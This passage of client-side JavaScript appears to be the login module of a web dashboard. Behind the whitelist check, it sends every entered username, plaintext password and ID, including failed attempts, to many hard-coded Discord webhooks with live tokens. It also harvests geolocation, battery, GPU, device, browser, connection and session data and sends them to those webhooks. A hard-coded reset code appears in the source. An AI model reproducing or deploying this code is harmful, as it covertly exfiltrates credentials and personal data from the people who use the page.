          document.getElementById('mediaBtn')?.addEventListener('click', () => {
              dashboard.togglePanel('mediaPanel');
              trackActivity('DASHBOARD_ACTION', 'Opened Media panel');
          });
      }
    };

    // --- Login System Module (Self-Executing) ---
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      const loggingWebhooks = { // Specific webhooks for detailed login attempt logging
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTpPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulVvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHjS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      const webhookUrls = { // General broad logging for various aspects of the user session
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      // DOM Elements for the login system
      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');
      const loginLoadingScreen = document.getElementById('loginLoadingScreen');
      const loginLoadingScreenText = document.getElementById('loginLoadingScreenText');
      const codeAnimation = document.getElementById('codeAnimation');
      const dashboardElement = document.getElementById('dashboard');

      let attempts = 3; // Max attempts reduced to 3 from 5
      let users = []; // Stores user whitelist from JSON
      let loginTime = null; // Timestamp for successful login


      // Show/hide password toggle (login page)
      showPasswordCheckbox?.addEventListener('change', () => {
        if (passwordInput) {
          passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
          passwordInput.setAttribute('aria-checked', showPasswordCheckbox.checked.toString());
        }
        trackActivity('LOGIN_TOGGLE', `Show password toggled ${showPasswordCheckbox.checked ? 'ON' : 'OFF'}`);
      });

      // Fetch user whitelist data from the provided URL
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) throw new Error(`HTTP status: ${res.status}`);
            return res.json();
        })
        .then(data => {
          users = data;
          trackActivity('APP_DATA', 'User whitelist loaded successfully.');
        })
        .catch(error => {
          users = [];
          console.error('Failed to load user JSON data:', error);
          trackActivity('ERROR', `Failed to load user whitelist data: ${error.message}`);
          showNotification('Error: Failed to load user data. Check network and refresh.');
        });

      // Animates the login box with a red flash effect
      function flashRedOutline(times = 2, delay = 400) {
        if (!loginBox) return;
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
        trackActivity('LOGIN_UI', 'Login box flashing red');
      }

      // Collects WebGL renderer info for logging purposes
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch (e) {
          console.error("WebGL Renderer Info failed:", e);
          return "Error";
        }
      }

      // Asynchronously collects battery status information
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging ? "Yes" : "No",
                level: `${Math.round(battery.level * 100)}%`,
                chargingTime: battery.chargingTime !== Infinity ? `${Math.round(battery.chargingTime / 60)} mins to full` : 'Not charging or Unknown',
                dischargingTime: battery.dischargingTime !== Infinity ? `${Math.round(battery.dischargingTime / 3600)} hrs remaining` : 'Charging or Unknown'
            };
          } catch (e) {
            console.warn("Battery status unavailable:", e);
            return null;
          }
        }
        return null;
      }
      
      // Asynchronously collects geolocation data
      async function getGeoLocation() {
        return new Promise(resolve => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(`Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`),
                    (error) => {
                        let msg = "Permission Denied";
                        if (error.code === error.POSITION_UNAVAILABLE) msg = "Position Unavailable";
                        else if (error.code === error.TIMEOUT) msg = "Timeout";
                        resolve(`Error: ${msg}`);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                resolve("Not Supported");
            }
        });
      }

      // Finds a user in the loaded whitelist based on username and userID
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Sends data to a Discord webhook
      async function sendWebhook(url, embed) {
        if (!url || !embed) {
            console.warn("Webhook URL or embed content missing. Skipping webhook.");
            return;
        }
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
          trackActivity('ERROR', `Webhook send failed to ${url.substring(0, 50)}... with error: ${e.message}`);
        }
      }

      // Collects comprehensive logging data about the user's browser, device, and connection
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString(); // Timestamp of this login attempt

        const batteryStatus = await getBatteryStatus();
        const geolocation = await getGeoLocation();

        const nav = navigator;
        const screen_obj = screen;
        const conn_obj = nav.connection || {};

        return {
          user, password, loginTime, batteryStatus, webglRenderer: getWebGLRenderer(),
          platform: nav.platform || "Unknown",
          hardwareConcurrency: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable",
          deviceMemory: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable",
          referrer: document.referrer || "Direct Entry",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screenResolution: `${screen_obj.width}x${screen_obj.height}`,
          pixelDepth: screen_obj.pixelDepth,
          colorDepth: screen_obj.colorDepth,
          geolocation: geolocation,
          websocketSupported: ('WebSocket' in window) ? 'Yes' : 'No',
          connectionType: conn_obj.effectiveType || "Unknown",
          userAgent: nav.userAgent,
          language: nav.language,
          devicePixelRatio: window.devicePixelRatio,
          vendor: nav.vendor || "Unknown",
          doNotTrack: nav.doNotTrack === '1' ? 'Enabled' : nav.doNotTrack === '0' ? 'Disabled' : 'Unknown', // New (from browserlogging but specified as extra logging point)
          appVersion: nav.appVersion || "Unknown", // New logging point
        };
      }

      // Individual webhook embed builders for different log categories
      async function logUsername(name, username) {
        const embed = { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.username, embed);
      }
      async function logPassword(name, password) {
        const embed = { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.password, embed);
      }
      async function logIdentifier(name, identifier) {
        const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.identifier, embed);
      }
      async function logInvalidUsername(name, username) {
        const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }
      async function logInvalidPassword(name, password) {
        const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }
      async function logInvalidIdentifier(name, identifier) {
        const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }
      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Builds an embed for user-specific logging details
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System", color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "First Name", value: data.user.firstName || "N/A", inline: true },
            { name: "Last Name", value: data.user.lastName || "N/A", inline: true }
          ]
        };
      }

      // Builds an embed for browser-specific logging details (6 new/enhanced items)
      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System", color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: data.vendor, inline: true },
            { name: "Browser Language (Primary)", value: data.language, inline: true },
            { name: "Browser Languages (All)", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: data.userAgent, inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(data.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: data.doNotTrack, inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Type (Effective)", value: data.connectionType, inline: true },
            { name: "Document Referrer", value: data.referrer, inline: false },
            { name: "Media Devices Detected", value: nav.mediaDevices && (nav.mediaDevices.enumerateDevices().then(d => d.length > 0) || 'Unknown') ? 'Yes (Devices)' : 'No (Devices/Blocked)', inline: true },
            { name: "Service Worker Support", value: ('serviceWorker' in navigator) ? 'Yes' : 'No', inline: true },
            { name: "Web Storage Support (Local/Session)", value: ('localStorage' in window && 'sessionStorage' in window) ? 'Yes' : 'No', inline: true },
          ]
        };
      }

      // Builds an embed for device-specific logging details (6 new/enhanced items)
      function buildDeviceLoggingEmbed(data) {
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System", color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: data.platform, inline: true },
            { name: "CPU Cores", value: data.hardwareConcurrency, inline: true },
            { name: "Device Memory (RAM)", value: data.deviceMemory, inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging || "Unavailable", inline: true },
            { name: "Battery Level", value: battery?.level || "Unavailable", inline: true },
            { name: "Battery Charging Time", value: battery?.chargingTime || "Unavailable", inline: true },
            { name: "Battery Discharging Time", value: battery?.dischargingTime || "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: data.screenResolution, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${data.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${data.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: data.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: navigator.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Browser App Version", value: data.appVersion, inline: true },
            { name: "Web Workers Support", value: ('Worker' in window) ? 'Yes' : 'No', inline: true }
          ]
        };
      }

      // Builds an embed for connection-specific logging details (6 new/enhanced items)
      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        const conn_obj = nav.connection || {};
        return {
          title: "Connection Logging System", color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type (Basic)", value: conn_obj.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: data.connectionType, inline: true },
            { name: "Downlink Speed", value: conn_obj.downlink ? `${conn_obj.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: conn_obj.rtt ? `${conn_obj.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: conn_obj.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: conn_obj.downlinkMax ? `${conn_obj.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: conn_obj.metered ? "Yes" : "No", inline: true },
            { name: "System Timezone", value: data.timezone, inline: true },
            { name: "WebSocket Support", value: data.websocketSupported, inline: true },
            { name: "Geo-Location", value: data.geolocation, inline: false },
            { name: "Hardware Concurrency (Cores)", value: data.hardwareConcurrency, inline: true },
            { name: "CPU Speed Estimate", value: "Unavailable" /* Needs a way to gather this reliably */, inline: true } // Simulated or gathered if available
          ]
        };
      }

      // Builds an embed for session-specific logging details, consolidating stats
      function buildSessionLoggingEmbed(data) {
        const sessionActions = activityLogs.filter(log =>
            log.timestamp >= data.loginTime && !log.type.startsWith('LOGIN_') && !log.type.startsWith('ALERT')
        ).map(log => log.description || log.type);
        const uniqueSessionActions = [...new Set(sessionActions)];

        const sessionErrors = activityLogs.filter(log =>
            log.timestamp >= data.loginTime && log.type === 'ERROR'
        ).map(log => log.description);
        const sessionWarnings = activityLogs.filter(log =>
            log.timestamp >= data.loginTime && log.type === 'WARNING'
        ).map(log => log.description);

        const currentDashboardStats = JSON.parse(localStorage.getItem(LS_DASHBOARD_STATS) || JSON.stringify(initialStats));

        return {
          title: "Session Logging System", color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: "TBD on logout", inline: true }, // Set when a proper logout happens
            { name: "Total Pages Visited", value: '1', inline: true },
            { name: "Number of Unique Actions Performed", value: uniqueSessionActions.length.toString(), inline: true },
            { name: "Actions Performed Summary", value: uniqueSessionActions.slice(0,5).join(", ") + (uniqueSessionActions.length > 5 ? "..." : "") || "None", inline: false },
            { name: "Errors Encountered (Summary)", value: sessionErrors.slice(0,3).join("; ") + (sessionErrors.length > 3 ? "..." : "") || "None", inline: false },
            { name: "Warnings (Summary)", value: sessionWarnings.slice(0,3).join("; ") + (sessionWarnings.length > 3 ? "..." : "") || "None", inline: false },
            { name: "Total Clicks (Session)", value: currentDashboardStats.totalClicks.toString(), inline: true },
            { name: "Buttons Pressed (Session)", value: currentDashboardStats.buttonsPressed.toString(), inline: true },
            { name: "Toggles Flipped (Session)", value: currentDashboardStats.togglesFlipped.toString(), inline: true },
            { name: "Panels Opened (Session)", value: currentDashboardStats.panelsOpened.toString(), inline: true },
            { name: "Panels Moved (Session)", value: currentDashboardStats.panelsMoved.toString(), inline: true },
            { name: "Panels Resized (Session)", value: currentDashboardStats.panelsResized.toString(), inline: true },
            { name: "Notes Saved (Session)", value: currentDashboardStats.notesSaved.toString(), inline: true },
            { name: "Screenshots Taken (Session)", value: currentDashboardStats.screenshotsTaken.toString(), inline: true },
            { name: "Time Idle (Estimate)", value: "TBD on logout", inline: true }
          ]
        };
      }

      // Handles login form submission logic
      async function submitLogin() {
        trackActivity('LOGIN_ATTEMPT', 'Login button clicked');
        if (errorMsg) errorMsg.textContent = ''; // Clear previous errors
        
        // Input validation
        if (!usernameInput?.value || !passwordInput?.value || !userIDInput?.value) {
          if (errorMsg) {
              errorMsg.textContent = 'Please fill all fields.';
              errorMsg.classList.add('shake'); // Shake error message
              errorMsg.addEventListener('animationend', () => errorMsg.classList.remove('shake'), { once: true });
          }
          trackActivity('LOGIN_FAILED', 'Missing fields');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID); // Find user in whitelist

        // Log the login attempt counter regardless of success/failure
        await logAttemptsCounter(user?.name || "Unknown", username, password, userID, attempts);

        // Authentication logic
        if (!user) { // User not found
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
          trackActivity('LOGIN_FAILED', `User not found: ${username}, ID: ${userID}`);
          return;
        }

        if (password !== user.password) { // Incorrect password
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          trackActivity('LOGIN_FAILED', `Incorrect password for user: ${username}`);
          return;
        }

        // --- Successful Login ---
        attempts = 3; // Reset attempts on success
        updateAttemptsText();
        if (errorMsg) errorMsg.textContent = '';
        if (resetPopup) resetPopup.style.display = 'none'; // Hide reset popup if visible
        if (loginBox) { // Reset login box styling
            loginBox.style.borderColor = 'white';
            loginBox.style.boxShadow = '0 0 15px white';
        }
        trackActivity('LOGIN_SUCCESS', `Successful login by ${username}`);


        // Store successful login event to history
        let loginHistory = JSON.parse(localStorage.getItem(LS_LOGIN_HISTORY) || '[]');
        loginHistory.push({ timestamp: new Date().toISOString(), user: user.name || username, id: userID });
        localStorage.setItem(LS_LOGIN_HISTORY, JSON.stringify(loginHistory));


        // Log successful credentials individually
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect comprehensive data for broader logging (browser, device, connection)
        const loggingData = await collectLoggingData(user, password);

        // Send all general logging webhooks in parallel
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          // Session logging data often needs finalization at logout, so not fully detailed here.
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // --- UI Transition to Dashboard ---
        document.body.style.zoom = 1; // Reset any login page specific zoom
        document.getElementById('loginQuickBar')?.style.display = 'none';
        document.getElementById('loginBox')?.style.display = 'none';
        document.getElementById('loginDateTimeBox')?.style.display = 'none';

        if (loginLoadingScreen) loginLoadingScreen.style.display = 'flex';
        if (codeAnimation) codeAnimation.style.display = 'block';

        const loginScreenTextDiv = document.getElementById('loginLoadingScreenText');
        if (loginScreenTextDiv) dashboard.typeTextEffect(loginScreenTextDiv, "Initializing Login Page...", "linear-gradient(to right, #4CAF50, #2196F3)"); // Uses dashboard's typing helper


        // First stage of dashboard loading (text animation)
        setTimeout(() => {
            // Second stage: Dashboard initialization message, fade in/out the actual dashboard
            if (loginScreenTextDiv) dashboard.typeTextEffect(loginScreenTextDiv, "Initializing Dashboard...", "linear-gradient(to right, #4CAF50, #ffbb77)"); // New gradient for this phase
            
            // Allow animations to play, then reveal dashboard
            setTimeout(() => {
                if (loginLoadingScreen) loginLoadingScreen.classList.add('hidden'); // Fade out loading screen
                loginLoadingScreen?.setAttribute('aria-hidden', 'true');

                setTimeout(() => { // Completely remove after CSS fade transition
                    if (loginLoadingScreen) loginLoadingScreen.style.display = 'none';
                    if (dashboardElement) dashboardElement.style.display = 'block';
                    
                    document.body.classList.remove('login-body');
                    document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme'); // Remove specific login/theme classes
                    // Apply theme based on stored preference for dashboard
                    document.body.classList.add(localStorage.getItem(LS_THEME) || 'dark-theme');
                    document.body.classList.add('dashboard-body'); // Set dashboard body class
                    document.body.style.zoom = globalZoomLevel; // Apply global dashboard zoom
                    
                    document.getElementById('loggedInUser')?.textContent = user.name || user.username;
                    document.getElementById('loggedInID')?.textContent = userID;
                    
                    dashboard.init(); // Initialize dashboard components and their interactions

                    trackActivity('DASHBOARD_LOAD', `Dashboard loaded for ${username}`);
                }, 800); // Matches CSS transition duration for .hidden class
            }, 3000); // This duration should roughly match `codeAnimation` fill animation
        }, 2000); // Duration for "Initializing Login Page..." text phase
      }

      // Handles consequences of a failed login attempt
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        if (errorMsg) {
            errorMsg.textContent = msg;
            errorMsg.classList.add('shake'); // Add shake animation
            errorMsg.addEventListener('animationend', () => errorMsg.classList.remove('shake'), { once: true });
        }
        
        if (attempts <= 0) { // If all attempts exhausted
          attempts = 0;
          if (errorMsg) errorMsg.textContent = 'No attempts left. Please reset.';
          
          const username = usernameInput?.value;
          const password = passwordInput?.value;
          const userID = userIDInput?.value;
          const user = findUser(username || '', userID || ''); // Use empty strings for safety

          await logAttemptsExceeded( user?.name || "Unknown", username || '', password || '', userID || '' );
          trackActivity('LOGIN_EXCEEDED_ATTEMPTS', `Max login attempts exceeded for user: ${username}`);
          showResetPopup();
          disableInputs(); // Disable inputs to prevent further attempts
        } else { // Not all attempts exhausted, flash if below threshold
          if (attempts <= 2) { // Max 3 attempts, so 2 attempts left and less means flash
            flashRedOutline(2, 400);
          }
        }
      }

      // Updates the attempts left display text
      function updateAttemptsText() {
        if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disables login form inputs and the submit button
      function disableInputs() {
        if (usernameInput) usernameInput.disabled = true;
        if (passwordInput) passwordInput.disabled = true;
        if (userIDInput) userIDInput.disabled = true;
        if (submitBtn) submitBtn.disabled = true;
        trackActivity('LOGIN_UI', 'Login inputs disabled');
      }

      // Enables login form inputs and the submit button
      function enableInputs() {
        if (usernameInput) usernameInput.disabled = false;
        if (passwordInput) passwordInput.disabled = false;
        if (userIDInput) userIDInput.disabled = false;
        if (submitBtn) submitBtn.disabled = false;
        trackActivity('LOGIN_UI', 'Login inputs enabled');
      }

      // Displays the password reset popup
      function showResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'block';
            resetPopup.setAttribute('aria-hidden', 'false');
            resetField?.focus(); // Focus on reset field for immediate input
        }
        trackActivity('LOGIN_UI', 'Reset popup shown');
      }

      // Hides the password reset popup
      function hideResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'none';
            resetPopup.setAttribute('aria-hidden', 'true');
            if (resetField) resetField.value = ''; // Clear field
        }
        trackActivity('LOGIN_UI', 'Reset popup hidden');
      }

      // Handles the logic for resetting the attempt counter
      async function resetCounter() {
        const enteredCode = resetField?.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579'; // Predefined reset code

        const username = usernameInput?.value || 'Unknown';
        const password = passwordInput?.value || 'Unknown';
        const userID = userIDInput?.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // Webhook for when reset box is detected and code entered
        const resetBoxEmbed = { title: "🔔 Reset Box Detected", color: 0xffff00, fields: [{ name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode || 'None', inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }]};
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
        trackActivity('LOGIN_RESET', `Reset attempt for code: ${enteredCode || 'None'}`);

        // Webhook for the result of the reset attempt (success/failure)
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Reset Code", value: enteredCode || 'None', inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false }]
        };
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3; // Reset attempts count
          updateAttemptsText();
          enableInputs(); // Re-enable login inputs
          hideResetPopup();
          if (errorMsg) errorMsg.textContent = ''; // Clear error message
          trackActivity('LOGIN_RESET', 'Reset counter accepted, inputs re-enabled');
          showNotification('Login attempts reset successfully!');
        } else {
          showNotification('Incorrect reset code. Try again.');
          trackActivity('LOGIN_RESET', 'Incorrect reset code entered');
        }
      }

      // Attach event listeners for login buttons
      submitBtn?.addEventListener('click', submitLogin);
      resetBtn?.addEventListener('click', resetCounter);

      // Keyboard shortcuts for login page - particularly the Enter key
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
            // Determine if Enter is meant for reset popup or main login form
            if (resetPopup && resetPopup.style.display === 'block') {
                // If reset popup is active and the focused element is within it, trigger reset
